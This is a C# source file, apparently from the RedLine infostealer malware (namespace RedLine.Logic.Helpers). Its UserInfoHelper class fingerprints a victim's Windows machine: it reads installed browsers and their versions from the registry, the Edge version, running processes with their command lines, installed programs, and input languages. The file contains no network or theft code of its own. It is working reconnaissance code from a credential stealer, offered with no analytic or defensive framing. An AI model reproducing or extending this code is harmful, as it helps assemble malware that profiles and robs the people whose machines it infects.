using Microsoft.Win32;
using RedLine.Logic.Extensions;
using RedLine.Models;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace RedLine.Logic.Helpers
{
	public static class UserInfoHelper
	{
		public static List<InstalledBrowserInfo> GetBrowsers()
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\WOW6432Node\\Clients\\StartMenuInternet");
			if (registryKey == null)
			{
				registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Clients\\StartMenuInternet");
			}
			string[] subKeyNames = registryKey.GetSubKeyNames();
			List<InstalledBrowserInfo> list = new List<InstalledBrowserInfo>();
			for (int i = 0; i < subKeyNames.Length; i++)
			{
				InstalledBrowserInfo installedBrowserInfo = new InstalledBrowserInfo();
				RegistryKey registryKey2 = registryKey.OpenSubKey(subKeyNames[i]);
				installedBrowserInfo.Name = (string)registryKey2.GetValue(null);
				RegistryKey registryKey3 = registryKey2.OpenSubKey("shell\\open\\command");
				installedBrowserInfo.Path = registryKey3.GetValue(null).ToString().StripQuotes();
				if (installedBrowserInfo.Path != null)
				{
					installedBrowserInfo.Version = FileVersionInfo.GetVersionInfo(installedBrowserInfo.Path).FileVersion;
				}
				else
				{
					installedBrowserInfo.Version = "Unknown Version";
				}
				list.Add(installedBrowserInfo);
			}
			InstalledBrowserInfo edgeVersion = GetEdgeVersion();
			if (edgeVersion != null)
			{
				list.Add(edgeVersion);
			}
			return list;
		}

		private static InstalledBrowserInfo GetEdgeVersion()
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\CurrentVersion\\AppModel\\SystemAppData\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\Schemas");
			if (registryKey != null)
			{
				Match match = Regex.Match(registryKey.GetValue("PackageFullName").ToString().StripQuotes(), "(((([0-9.])\\d)+){1})");
				if (match.Success)
				{
					return new InstalledBrowserInfo
					{
						Name = "MicrosoftEdge",
						Version = match.Value
					};
				}
			}
			return null;
		}

		public static List<string> ListOfProcesses()
		{
			List<string> list = new List<string>();
			try
			{
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher($"SELECT * FROM Win32_Process Where SessionId='{Process.GetCurrentProcess().SessionId}'"))
				{
					using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
					{
						foreach (ManagementObject item in managementObjectCollection)
						{
							try
							{
								list.Add("ID: " + item["ProcessId"]?.ToString() + ", Name: " + item["Name"]?.ToString() + ", CommandLine: " + item["CommandLine"]);
							}
							catch (Exception value)
							{
								Console.WriteLine(value);
							}
						}
						return list;
					}
				}
			}
			catch
			{
				return list;
			}
		}

		public static List<string> ListOfPrograms()
		{
			List<string> list = new List<string>();
			try
			{
				using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall"))
				{
					string[] subKeyNames = registryKey.GetSubKeyNames();
					foreach (string name in subKeyNames)
					{
						using (RegistryKey registryKey2 = registryKey.OpenSubKey(name))
						{
							string text = (string)registryKey2?.GetValue("DisplayName");
							if (!string.IsNullOrEmpty(text))
							{
								list.Add(text);
							}
						}
					}
				}
			}
			catch
			{
			}
			return list.OrderBy((string x) => x).ToList();
		}

		public static List<string> AvailableLanguages()
		{
			List<string> list = new List<string>();
			try
			{
				foreach (InputLanguage installedInputLanguage in InputLanguage.InstalledInputLanguages)
				{
					list.Add(installedInputLanguage.Culture.EnglishName);
				}
				return list;
			}
			catch
			{
				return list;
			}
		}
	}
}
